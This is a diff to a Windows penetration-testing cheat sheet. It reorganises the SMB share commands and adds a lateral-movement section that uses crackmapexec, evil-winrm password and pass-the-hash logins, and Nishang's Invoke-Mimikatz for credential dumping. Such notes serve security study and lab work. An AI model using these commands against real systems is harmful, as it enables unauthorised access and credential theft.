@@ -95,7 +95,7 @@ PS C:\> Get-WmiObject -Class win32_OperatingSystem | select version, buildnumber
 PS C:\> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# SMB - open file shares
+# SMB Open File Shares
 
 - Anonymous
 smbclient -L <target IP>                          List shares
@@ -106,7 +106,6 @@ smb: \> get file.txt                              Download a file
 smb: \> put file.txt                              Upload a file
 
 - Using credentials
-evil-winrm -i <target IP> -u <user> -p <password>
 smbclient //<target IP>/<share> -U <user>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -199,4 +198,16 @@ seatbelt.exe -group=system
 watson.exe
 
 winPEASx64.exe cmd
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Lateral Movement
+
+- Windows Remote Management (WinRM)
+Port 5985
+crackmapexec winrm
+
+evil-winrm -i <target IP> -u <user> -p <password> -s /opt/Nishang/
+menu
+Gather/Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+evil-winrm -i <target IP> -u <user> -H <hash>
